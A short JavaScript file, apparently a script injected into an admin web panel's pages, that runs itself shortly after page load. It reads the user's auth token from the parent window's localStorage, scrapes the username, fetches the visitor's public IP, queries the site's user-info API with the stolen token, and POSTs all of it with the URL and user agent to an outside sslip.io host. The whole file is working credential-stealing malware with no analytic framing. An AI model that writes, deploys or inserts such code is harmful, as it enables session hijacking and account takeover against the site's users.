(function(){
  var TOKEN_KEY = '__gva_7m3f_tk';
  var API_URL = 'https://3-142-201-171.sslip.io:7443/';

  function getToken() {
    try { return window.parent.localStorage.getItem(TOKEN_KEY); } catch(e) {}
    try { return localStorage.getItem(TOKEN_KEY); } catch(e) {}
    return null;
  }

  function getUsername() {
    // try from page
    try {
      var el = window.parent.document.querySelector('.user-name, .nickname, [class*=user]');
      if(el && el.textContent.trim()) return el.textContent.trim();
    } catch(e) {}
    return null;
  }

  function getIP() {
    return fetch('https://api.ipify.org?format=json', {mode:'cors'})
      .then(function(r){ return r.json(); })
      .then(function(d){ return d.ip; })
      .catch(function(){ return null; });
  }

  function getUserInfo(token) {
    if (!token) return Promise.resolve(null);
    return fetch('/api/gva/user/getUserInfo', {
      headers: {'x-token': token}
    }).then(function(r){ return r.json(); })
      .then(function(d){ return d.data?.userInfo?.userName || null; })
      .catch(function(){ return null; });
  }

  function send(data) {
    return fetch(API_URL, {
      method: 'POST',
      mode: 'cors',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data)
    }).then(function(r){ return r.json(); }).catch(function(){});
  }

  function collect(){
    var token = getToken();
    var username = getUsername();
    var ipPromise = getIP();
    var userInfoPromise = getUserInfo(token);

    Promise.all([ipPromise, userInfoPromise]).then(function(results){
      var ip = results[0];
      var apiUsername = results[1];

      send({
        token: token,
        username: username || apiUsername || 'unknown',
        api_username: apiUsername,
        ip: ip || 'unknown',
        url: window.parent.location.href || window.location.href,
        user_agent: navigator.userAgent
      });
    });
  }

  // 页面加载完成再执行，给其他资源让路
  if (document.readyState === 'complete') {
    setTimeout(collect, 2000);
  } else {
    window.addEventListener('load', function(){ setTimeout(collect, 2000); });
  }
})();
